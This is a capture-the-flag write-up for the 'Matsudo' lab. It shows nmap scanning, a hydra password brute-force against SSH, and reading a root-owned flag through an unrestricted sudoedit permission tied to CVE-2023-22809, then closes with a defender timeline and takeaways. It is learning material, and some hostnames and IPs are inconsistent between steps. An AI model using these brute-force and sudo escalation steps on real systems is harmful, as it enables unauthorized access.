# Matsudo - CTF, Locate both the User and Root Flags

## The Scenario
The server looks secure from the outside, but weak credentials and dangerous sudo configurations lead to complete system compromise.


## Approach

First order of business was to find the SSH port and version, and a user with the ability to connect remotely to the server/system. Once access is gained, find the user flag file. Finally find a process or service that will allow for the logged in user to gain sudo or root privilege access, and read the root flag.

## Findings

First locate the open port(s) and find an open SSH port and the version:

``` bash
$ nmap -sV -sC -p- -T3 $TARGET
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-21 21:50 +0000
Nmap scan report for matsudo (63.32.53.23)
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6 (protocol 2.0)
| ssh-hostkey: 
|   256 d2:5d:48:e5:2d:c8:df:83:cb:c1:b7:88:14:09:49:53 (ECDSA)
|_  256 58:d2:a8:79:41:a2:ca:08:ad:df:28:34:e0:b0:bf:4b (ED25519)
80/tcp open  http    Apache httpd 2.4.65 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.65 (Unix)
|_http-title: Server Status
```
And

``` bash
$ nmap -p22 --script ssh-auth-methods $TARGET
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-21 21:57 +0000
Nmap scan report for matsudo (63.32.53.23)
Host is up (0.000060s latency)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|     password
|     keyboard-interactive
|   Banner:
| ****************************************************
| *              Welcome to XXXXXX's Server         *
| * Please note that all activities may be monitored *
| *          Use your privileges responsibly         *
|_****************************************************
```

This was telling as a username (XXXXXX's) was given and a name to try to login with.

Needed a password, and used hydra against that username:

```bash
$ hydra -l XXXXXX -P /usr/share/wordlists/rockyou.txt $TARGET ssh -t 4 -f
[22][ssh] host: 63.33.67.115   login: XXXXXX   password: XXXXXX
```
Now that I had a username and password, time to log into the server:

``` bash
$ ssh XXXXXX@$TARGET
```

Located the flag file in the home users directory

``` bash
$ cat flag-user.txt 
XXXXXXXX-XXXX-XXXXXXXXXXXXip-10-0-0-0:~$
```

Next up, find a way to get root access (hint suggested sudo exploit):

As the use
``` bash
ip-10-0-0-0:/etc$ sudo --list 
User charlie may run the following commands on ip-10-0-0-0:
    (ALL) sudoedit
```

and

Confirmed sudo, sudoedit and variable(s) location, permissions, and versions

``` bash
ip-10-0-0-0:~$ which sudoedit
/usr/local/bin/sudoedit

ip-10-0-0-0:~$ l /usr/local/bin/sudoedit 
lrwxrwxrwx    1 root     root             4 Sep  3  2025 /usr/local/bin/sudoedit -> sudo
```
``` bash
ip-10-0-5-160:~$ which sudo
/usr/local/bin/sudo

ip-10-0-5-160:~$ ls -l /usr/local/bin/sudo
-rwsr-xr-x    1 root     root        950840 Sep  3  2025 /usr/local/bin/sudo
```

``` bash
ip-10-0-5-160:~$ sudo --version
Sudo version 1.9.12p1
Sudoers policy plugin version 1.9.12p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.12p1
Sudoers audit plugin version 1.9.12p1
```

``` bash
ip-10-0-0-0:~$ echo "$EDITOR"
<nothing displayed>

ip-10-0-0-0:~$ echo "$VISUAL"
<nothing displayed>

ip-10-0-11-34:~$ echo $SUDO_EDITOR
<nothing displayed>
```

This is the exploit as sudo versions below 1.9.12.p2 allow a local attacker to append arbitrary entries to the list of files to process.

``` bash
ip-10-0-0-0:~$ sudoedit /root/flag-root.txt
```

Flag-root.txt
XXXXXXXX-XXXX-XXXXXXXXXXXX



## Timeline / IOCs

This section reconstructs the attack in the order it happened, then lists the
indicators of compromise (IOCs) a defender could use to detect the same activity.

## Timeline

| Step | Action | Evidence |
|------|--------|----------|
| 1 | Reconnaissance | 'nmap' identified SSH (port 22) and HTTP (port 80) |
| 2 | Credential discovery | Hydra was used to obtain SSH access as user XXXXXX |
| 3 | Login as the user via SSH | do recon via enumeration in the users home directory structure looking for a user flag |
| 4 | View and copy the user flag and submit it for the challenge | `cat "filename"` to view the flag file |
| 5 | Find a way to run sudo | sudo version 1.9.12p1 was identified as potentially vulnerable to CVE-2023-22809 |
| 6 | sudoedit to view the root flag | `sudoedit /root/XXXX-XXXX.tx` |


## Takeaway

This demonstrates why unrestricted sudoedit permissions is dangerous and can expose files outside the user's normal access.  

Once accessed, investigate sudo -l to check access by the logged in user
The permission of (ALL) sudoedit can expose root owned files
Because sudoedit permission allowed anyone to access it, I did not need to open a root shell

## Link to Challange
[Matsudo](https://hackerdna.com/labs/matsudo)